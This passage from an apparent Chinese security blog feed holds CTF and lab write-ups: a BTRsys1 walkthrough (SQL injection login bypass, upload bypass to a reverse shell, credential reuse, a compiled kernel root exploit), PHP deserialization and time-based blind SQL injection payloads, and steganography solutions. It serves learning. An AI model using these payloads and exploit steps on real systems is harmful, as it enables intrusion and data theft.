title="总结："></a>总结：</h2><ol><li>内核漏洞<br>在kali当中找相应版本的漏洞，看有无适应当前版本的可以利用的漏洞。</li><li>明文root密码<br>要求拿到的用户，刚好有可以读取shadow和passwd文件的权限。</li><li>计划任务<br>计划的任务修改执行对应的脚本可以获取root权限，待尝试~</li><li>密码复用<br>已知其他用户的密码，可以推测root用户的密码也是相同的（PS：不得不说我自己的就是，我的kali普通用户和root用户设置的密码是一样的，因为懒）<br>以上是几种常见的提权方式，这次学习收获很多。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列结————综合环境</title>
      <link href="/2020/08/24/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E7%BB%93%E2%80%94%E2%80%94%E7%BB%BC%E5%90%88%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/08/24/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E7%BB%93%E2%80%94%E2%80%94%E7%BB%BC%E5%90%88%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><font color=#999AAA >这次就是靶场系列的最后一篇了，这段时间学习这个系列的知识，感觉确实学到很多东西。现在做一下总结吧。</font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="一、综合环境——低难度"><a href="#一、综合环境——低难度" class="headerlink" title="一、综合环境——低难度"></a>一、综合环境——低难度</h1><p><font color=#999AAA >tip：emmm，与之前重复的内容这里就不再提了，主要记录下思路。</p><p><font color=#999AAA >使用nikto和dirb等工具探测过后，发现了以下敏感页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">login.php</span><br><span class="line">index.php</span><br><span class="line">config.php</span><br></pre></td></tr></table></figure><p><font color=#999AAA >其中login.php是个登录页面。没有信息，先查看源码(其实我先尝试了弱口令，但是没有成功，还是乖乖的看源码)<br>在源码的最后发现了javascript的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">control</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> user = <span class="built_in">document</span>.getElementById(<span class="string">&quot;user&quot;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> pwd = <span class="built_in">document</span>.getElementById(<span class="string">&quot;pwd&quot;</span>).value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str=user.substring(user.lastIndexOf(<span class="string">&quot;@&quot;</span>)+<span class="number">1</span>,user.length);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>((pwd == <span class="string">&quot;&#x27;&quot;</span>))&#123;</span><br><span class="line">alert(<span class="string">&quot;Hack Denemesi !!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (str!=<span class="string">&quot;btrisk.com&quot;</span>)&#123;</span><br><span class="line">alert(<span class="string">&quot;Yanlis Kullanici Bilgisi Denemektesiniz&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">document</span>.loginform.submit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font color=#999AAA >审计这段代码：substring和lastIndexOf都是截取字符串的两个函数，首先来了解一下这两个函数。<br><code>substring()</code><br><img src="https://img-blog.csdnimg.cn/20200819014131837.png" alt="m0re" loading="lazy"><br><font color=#999AAA >注意：如果start传入的参数比stop的参数大的话，该函数会自动调换start和stop的位置。参数 start 与 stop 相等，那么该方法返回的就是一个空串（即长度为 0 的字符串）。<br>下面是一个栗子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string start = <span class="literal">null</span>;</span><br><span class="line">string stop = <span class="literal">null</span>;</span><br><span class="line">string str = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">start = str.Substring(<span class="number">0</span>, <span class="number">1</span>);<span class="comment">//从第一个开始截取，共截取一位</span></span><br><span class="line">stop = str.Substring(str.Length - <span class="number">1</span>, <span class="number">1</span>);<span class="comment">//从最后一个开始截取，共截取一位</span></span><br><span class="line">Response.Write(qian + <span class="string">&quot;***&quot;</span> + hou);</span><br></pre></td></tr></table></figure><p><font color=#999AAA >输出结果：<code>a***g</code><br><code>lastIndexOf()</code><br><font color=#999AAA >作用：可返回一个指定的字符串值最后出现的位置，在一个字符串中的指定位置从后向前搜索<br><img src="https://img-blog.csdnimg.cn/20200819014638818.png" alt="m0re" loading="lazy"><br>注意：<code>lastIndexOf()</code> 方法对大小写敏感！<br>如果要检索的字符串值没有出现，则该方法返回 -1。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;m0re&quot;</span>;</span><br><span class="line">str = str.Substring(<span class="number">0</span>, str.LastIndexOf(<span class="string">&quot;r&quot;</span>));</span><br><span class="line">Response.Write(str);</span><br></pre></td></tr></table></figure><p><font color=#999AAA >截取r前面的字符串，输出为<code>m0</code><br>OK，这下再看代码就可以理解了。<br>1、首先<code>lastIndexOf()</code>先在user中查询<code>@</code>的位置，然后从其位置的后一位开始，到user的总长度这个范围内，substring函数起作用，截取字符串str。<br>2、继续，pwd不等于<code>&#39;</code>，猜测可能是防万能密码的吧。或者是绕过SQL注入。<br>3、str要等于btrisk.com<br><img src="https://img-blog.csdnimg.cn/20200819020406723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后进来一个页面，闹了半天没发现什么，最后才知道是姿势错了。不过也没白折腾。有学到新知识。<br><font color=#11FF11 >正确的姿势：<br><font color=#999AAA >对登录框进行fuzz测试，kali的wordlists下有字典，可以直接利用，抓包发送到 Intruder模块<br><img src="https://img-blog.csdnimg.cn/20200819021623822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>载入字典进行fuzz测试<br>直接测试成功，看到response页面有内容，去字典中找到这个payload进行登录。<br><img src="https://img-blog.csdnimg.cn/20200819022010285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>用户名：<code>@btrisk.com</code>密码：<code>&#39; or 1=1#</code></p><p><img src="https://img-blog.csdnimg.cn/20200819022438391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >这才是正确的界面。<br>然后就是文件上传，基础漏洞。进行测试，只能传图片。<br><img src="https://img-blog.csdnimg.cn/20200819103959937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >鉴于不知道是验证方式是什么，所以都测试一遍。先设置好代理，测试发现是前端检测。<br>使用burpsuite绕过前端检测，或者使用<code>%00</code>截断绕过。<br>只需要简单的修改后缀就可以了，其他的验证就没有了。<br>尝试可以进行绕过，就制作一个反弹shell，然后监听获取权限就OK了。<br>重复步骤。<br>然后得到一个www-data用户的权限，尝试提权，发现<code>sudo -l</code>返回的是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo: unable to resolve host BTRsys1</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br></pre></td></tr></table></figure><p><font color=#999AAA >没见过这样的，先放在一边。但是可以查看配置文件，之前扫描出来一个<code>config.php</code>，但是访问没有任何信息，这里可以cat一下源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">$con=mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;toor&quot;</span>,<span class="string">&quot;deneme&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Mysql Bağlantı hatası!: &quot;</span> . mysqli_connect_error();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font color=#999AAA >数据库root用户的密码是<code>toor</code><br>连接数据库前，先优化一下终端，因为数据库输入密码时，是读取键盘记录的，而shell是无法完成的，所以还是先进行优化一下终端。<br>然后进入数据库，进行遍历，查看到用户名密码，尝试提权<code>su - root</code><br>使用密码<code>asd123***</code></p><p><img src="https://img-blog.csdnimg.cn/20200819112943215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>最后得到flag。</p><h1 id="二、综合环境——较高难度"><a href="#二、综合环境——较高难度" class="headerlink" title="二、综合环境——较高难度"></a>二、综合环境——较高难度</h1><p><font color=#999AAA >这个其他没什么可记录的，就一点——内核提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 4.4.0</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200819153606983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >复制到桌面进行编译，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># gcc 41458.c -o rootshell</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># ls</span></span><br><span class="line">41458.c  rootshell</span><br></pre></td></tr></table></figure><p><font color=#999AAA >然后利用meterpreter的upload命令将rootshell上传并加权，进行chmod命令时，需要在反弹shell中执行，<br>赋予rootshell以777权限后执行文件就可以提权成功了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rootshell</span><br></pre></td></tr></table></figure><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><font color=#999AAA >涉及知识点：代码审计、fuzz测试、万能密码、文件上传、弱口令、内核提权<p><font color=#999AAA >CTF靶场系列就算完工了，还要继续努力鸭。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>近段时间参加的CTF竞赛部分题目复现</title>
      <link href="/2020/08/23/%E8%BF%91%E6%AE%B5%E6%97%B6%E9%97%B4%E5%8F%82%E5%8A%A0%E7%9A%84CTF%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0(ISCC2020%20%E3%80%81GKCTF%E3%80%81%E7%BD%91%E9%BC%8E%E6%9D%AF)/"/>
      <url>/2020/08/23/%E8%BF%91%E6%AE%B5%E6%97%B6%E9%97%B4%E5%8F%82%E5%8A%A0%E7%9A%84CTF%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0(ISCC2020%20%E3%80%81GKCTF%E3%80%81%E7%BD%91%E9%BC%8E%E6%9D%AF)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近比赛比较多，记录一下赛后总结</p><h1 id="ISCC-Misc"><a href="#ISCC-Misc" class="headerlink" title="ISCC  Misc"></a>ISCC  Misc</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p><img src="https://img-blog.csdnimg.cn/20200502105955393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>打开文件，一张png图片，在010Editor或winhex打开，找到修改高度就得到了flag，<img src="https://img-blog.csdnimg.cn/20200502110203773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>但是flag不是对的，然后想着肯定加密了，所以就去挨个试试，然后发现时维吉尼亚密码，密钥就是high，解密就得到flag。<br><img src="https://img-blog.csdnimg.cn/20200502110436465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="耳听为实"><a href="#耳听为实" class="headerlink" title="耳听为实"></a>耳听为实</h2><p><img src="https://img-blog.csdnimg.cn/20200511224733860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这道题也是突然有了灵感，当时没事在搜”音频隐写”，然后就看到了mp3stego这个工具(工具下载可直接在百度搜索，同时我将更新了我的安装配置踩坑记录这篇博客——里面有几个工具的，有兴趣的可以看下哦。)<br>需要密码，用010Editor打开音频文件，看到信息<br><img src="https://img-blog.csdnimg.cn/20200511225208799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>没错的，就是flag。<br>然后将<code>ABC.mp3</code>复制一份到MP3stego工具的目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X ABC.mp3 -P flag</span><br></pre></td></tr></table></figure><p>然后看到目录下生成一个txt文件。<br>打开看到信息<br><img src="https://img-blog.csdnimg.cn/20200511225541453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>百度网盘链接，那明显下面的base64编码就是提取密码了<br>又是一个音频，听了一遍，嗯，听不出来，那就下载那个音频在010Editor查看，<br><img src="https://img-blog.csdnimg.cn/20200511225956869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>在开头发现它是压缩包，还在末尾发现了<code>flag-RD.wav</code>,然后就改后缀，解压。<br><img src="https://img-blog.csdnimg.cn/20200511230152960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>当时就看不懂了。到这里就断了，好不甘心的。害！</p><p>emmm，听学长说可以直接对提交框进行爆破。这个操作666，正好flag是弱口令。这真想不到😂。<br>flag{password}</p><h2 id="千层套路"><a href="#千层套路" class="headerlink" title="千层套路"></a>千层套路</h2><p><img src="https://img-blog.csdnimg.cn/20200516222320228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>一个GIF动图，拼出来是这样的。<br><img src="https://img-blog.csdnimg.cn/20200516222335733.png" alt="j4y" loading="lazy"><br>先记在记事本中。<br>binwalk查看有没有隐藏文件。<br>看到有压缩包。分离出来。<br>需要密码才能解压。将记事本中的字符串输入。解压得到文件。<br>一个PDF文件、一个文本文件。看不懂，没有头绪，找学长问了下思路，了解到是需要像素点画图。用到了脚本。看了学长的博客：<a href="https://blog.csdn.net/qq_43625917/article/details/105259442#t12">千层套路</a><br>将脚本搬过来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">141</span>    <span class="comment">#x坐标  通过对txt里的行数进行整数分</span></span><br><span class="line">y = <span class="number">726</span>    <span class="comment">#y坐标  x * y = 行数</span></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))</span><br><span class="line">file = open(<span class="string">&#x27;1.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()  <span class="comment">#获取一行的rgb值</span></span><br><span class="line">        line = line[:<span class="number">-2</span>]</span><br><span class="line">        line = line[<span class="number">1</span>:]</span><br><span class="line">        <span class="comment">#print(line)</span></span><br><span class="line">        rgb = line.split(<span class="string">&quot;, &quot;</span>)  <span class="comment">#分离rgb，文本中逗号后面有空格</span></span><br><span class="line">        im.putpixel((i, j), (int(rgb[<span class="number">0</span>]), int(rgb[<span class="number">1</span>]), int(rgb[<span class="number">2</span>])))</span><br><span class="line">im.save(<span class="string">&#x27;test2.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>因为1.txt中是这样的。<br><img src="https://img-blog.csdnimg.cn/2020051712355232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>所以改成这样的。这是学长给的改版后的脚本。<br>学习了<a href="https://blog.csdn.net/FlashKoala/article/details/90649464">PIL模块使用</a><br><code>Image.new(mode, size, color)</code> 该方法可以创建指定图像，可在上面进行一些图像操作</p><ul><li>mode 图像色彩模式</li><li>size 图像大小</li><li>color 图像初始颜色<br>奥对了，还有就是1.txt的格式要写对。像这样<br><img src="https://img-blog.csdnimg.cn/20200517124449742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这样的话，file.readline一次读一行。不进行修改的话，其实是这样的。<br><img src="https://img-blog.csdnimg.cn/20200517124859983.png" alt="j4y" loading="lazy"><br>其实它只有一行的。格式不对。<br>file.readline去读的话，直接全部读下来，无法生成想要的文件。<br>脚本是python2版本的，所以到kali中去跑。<br><code>python2 1.py 1.txt</code><br>我已经把默认的python版本改成了python3，所以这么写为了保险。<br>结果出来是一张emmm，算是一张镜像图吧。因为他是反的。原本还看错了。最后交flag时，试了几遍发现不对。然后就想到了一个办法，在一张薄纸上抄下来字符串，然后从背面看，就可以了。<br>然后再看PDF，原本以为是隐写，然后找密码，找半天没找到，就想着是不是空密码，就用工具了，反正是不正确的想法。那个工具目前还没摸清楚怎么使用。所以问了学长。意思大概就是没有太复杂的。就是提示的那样，黑白啥的，忘了。然后用鼠标滑啊滑，在最后面找到了没有显示出来的东西(奇怪，我之前也这样试过，当时啥也没找到)。粘贴到记事本上得到了后一半的flag。<br><img src="https://img-blog.csdnimg.cn/20200517130019245.png" alt="j4y" loading="lazy"></li></ul><h1 id="ISCC-Web"><a href="#ISCC-Web" class="headerlink" title="ISCC Web"></a>ISCC Web</h1><h2 id="Php-is-the-best-language"><a href="#Php-is-the-best-language" class="headerlink" title="Php is the best language"></a>Php is the best language</h2><p><img src="https://img-blog.csdnimg.cn/20200511223610118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>打开下载好文件，<br><img src="https://img-blog.csdnimg.cn/20200511224208109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>考点：PHP反序列化，还有一个魔法函数的了解。学习博客还没写好，回头另发一篇。<br>经过反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;baby&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>所以payload是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:<span class="number">4</span>:<span class="string">&quot;baby&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200511224548700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>进行base64解码，得到flag。<br><img src="https://img-blog.csdnimg.cn/20200511224636934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="ISCC成绩查询-2"><a href="#ISCC成绩查询-2" class="headerlink" title="ISCC成绩查询-2"></a>ISCC成绩查询-2</h2><p><img src="https://img-blog.csdnimg.cn/20200521143818126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>复现， 之前听学长说时时间盲注，再看一下这道题。<br>先扫描一下IP，看到了flag.php<br><img src="https://img-blog.csdnimg.cn/2020052222381096.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>但是访问就会自动跳转index.php，所以抓包来看<br><img src="https://img-blog.csdnimg.cn/2020052222392149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>看到有两个参数<code>name</code>、<code>submit</code>，get 方式传参试试。<br><img src="https://img-blog.csdnimg.cn/20200522230156190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>学长说这个是过滤了空格和<code>#</code>,<br>给我说了方法，<br>将name值设为变量，进行爆破。<br>使用字典，fuzz一下，就能得出闭合符号了。<br><img src="https://img-blog.csdnimg.cn/20200523122744534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>说一下学长的方法，他绕过是用<code>/**/</code>来代替空格，用<code>%23</code>来代替<code>#</code><br><img src="https://img-blog.csdnimg.cn/20200523115419419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以看出sleep函数被执行了，代表语句插入正确了。<br>然后用qwzf大佬写的脚本进行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    chars=string.ascii_letters+string.digits</span><br><span class="line">    url=<span class="string">&quot;http://101.201.126.95:7007/flag.php&quot;</span></span><br><span class="line">    <span class="comment">#payload=&quot;&#x27;/**/or/**/if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(3),1)%23&quot; #pikachu</span></span><br><span class="line">    <span class="comment">#payload=&quot;&#x27;/**/or/**/if((ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),&#123;0&#125;,1))=&#123;1&#125;),sleep(3),1)%23&quot;#flag</span></span><br><span class="line">    <span class="comment">#payload=&quot;&#x27;/**/or/**/if((ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=\&quot;flag\&quot;/**/limit/**/0,1),&#123;0&#125;,1))=&#123;1&#125;),sleep(3),1)%23&quot;</span></span><br><span class="line">    payload=<span class="string">&quot;&#x27;/**/or/**/if((ascii(substr((select/**/flag/**/from/**/flag/**/limit/**/0,1),&#123;0&#125;,1))=&#123;1&#125;),sleep(3),1)%23&quot;</span></span><br><span class="line">    print(<span class="string">&quot;数据：&quot;</span>)</span><br><span class="line">    name=<span 